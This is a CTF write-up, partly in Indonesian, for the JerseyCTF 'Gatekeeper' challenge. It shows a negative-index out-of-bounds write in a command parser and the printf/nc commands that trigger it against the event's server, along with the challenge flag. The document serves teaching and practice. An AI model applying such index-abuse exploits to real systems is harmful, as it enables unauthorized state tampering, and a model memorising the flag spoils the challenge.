# CTF Writeup — Gatekeeper

**Event:** JerseyCTF  
**Category:** PWN / Binary Exploitation  
**Difficulty:** Easy  
**Flag:** `JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}`

---

## Challenge Description

> A degraded certificate authority once managed planetary gate transit across Orion's inner routes. Neptune remains locked, and only legacy certificates seem to matter now. Find a way to authorize Neptune transit and restore the first hop in the surviving gate chain.

**Files:** `gatekeeper_offline`, `README.txt`, `gate_route_notice.txt`  
**Remote:** `nc gatekeeper.aws.jerseyctf.com 31337`

---

## Reconnaissance

### Step 1 — Basic Binary Analysis

```bash
file gatekeeper_offline
# → ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

checksec --file=gatekeeper_offline
# → Partial RELRO, No canary, NX enabled, No PIE
```

Karena binary **not stripped**, symbol penting langsung kelihatan (`cmd_status`, `cmd_revoke`, `cmd_update`, `init_db`).

### Step 2 — Program Behavior

```bash
./gatekeeper_offline
```

Command yang tersedia:
- `status <CERT_ID>`
- `revoke <INDEX>`
- `update <INDEX> <VALID> <CLEARANCE>`

Tujuan challenge dari deskripsi: unlock Neptune transit.

### Step 3 — Locate Sensitive Logic

Dari disassembly `cmd_status`, kondisi Neptune untuk print flag adalah:
- `valid == 1`
- `clearance > 4`

Cert Neptune adalah `NEPT-1070`.

---

## Exploitation

### Step 4 — Vulnerability Discovery

Analisis fungsi `cmd_update` menunjukkan validasi index cacat:

- Ada cek `if idx > 3` → DENIED
- **Tidak ada cek `idx < 0`**

Artinya index negatif lolos dan akan dipakai dalam aritmetika offset struct array (out-of-bounds write).

### Step 5 — Primitive Validation (Local)

```bash
printf 'status NEPT-1070\nupdate -1 1 9\nstatus NEPT-1070\n' | ./gatekeeper_offline
```

Hasil:
- sebelum exploit: `valid=0 clearance=5`
- setelah exploit: `valid=1 clearance=9`
- kondisi gate terpenuhi, offline binary menampilkan fake flag

Jadi `update -1 1 9` sukses overwrite field Neptune dengan teknik negative index.

### Step 6 — Trigger on Remote

```bash
printf 'update -1 1 9\nstatus NEPT-1070\n' | nc gatekeeper.aws.jerseyctf.com 31337
```

Output remote mengembalikan flag live.

---

## Flag

```
JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}
```

---

## Vulnerability Summary

| # | Technique | Detail |
|---|---|---|
| 1 | **Out-of-Bounds Write** | `cmd_update` tidak cek batas bawah index (`idx < 0`) |
| 2 | **Negative Index Abuse** | `update -1 ...` menulis ke entri sebelum index 0 yang dipakai command logic Neptune |
| 3 | **Data-Only Exploit** | Tidak perlu hijack RIP/ROP, cukup ubah data `valid` dan `clearance` |

---

## Tools Used

- `file`, `checksec`, `nm`, `objdump`, `strings` — static analysis
- `nc` — interact with remote service
- Python + `pwntools` — automation solver (`solve.py`)

---

## Attack Flow

```
Command parser (update)
      │
      ▼
Missing lower-bound check on index
      │
      ▼
update -1 1 9
      │
      ▼
Overwrite Neptune state (valid=1, clearance=9)
      │
      ▼
status NEPT-1070
      │
      ▼
Condition satisfied in cmd_status
      │
      ▼
JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}
```

---

## Installation

```bash
# pakai venv sesuai environment
source /home/nata/ctf_env/bin/activate

# run solver ke remote
./solve.py REMOTE
```
